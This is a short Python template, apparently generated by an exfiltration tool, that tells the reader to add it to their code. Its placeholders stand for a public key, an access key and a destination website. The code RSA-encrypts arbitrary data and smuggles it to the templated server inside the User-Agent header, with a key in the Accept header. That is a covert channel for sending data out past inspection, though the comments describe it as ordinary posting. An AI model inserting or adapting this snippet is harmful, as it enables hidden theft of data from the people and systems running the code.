# Add this snippet to your code to post data to server
import requests, rsa
from rsa import PublicKey
# Send data to server
def payload(data):
    # Encrypt data
    publicKey = {{publicKey}}
    data = rsa.encrypt(str(data).encode(), publicKey).hex()
    headers = {
    "Accept": "{{postKey}}",
    "User-Agent": data
    }
    request = requests.post("{{website}}",headers=headers)
    if(request.status_code == 200):
        return True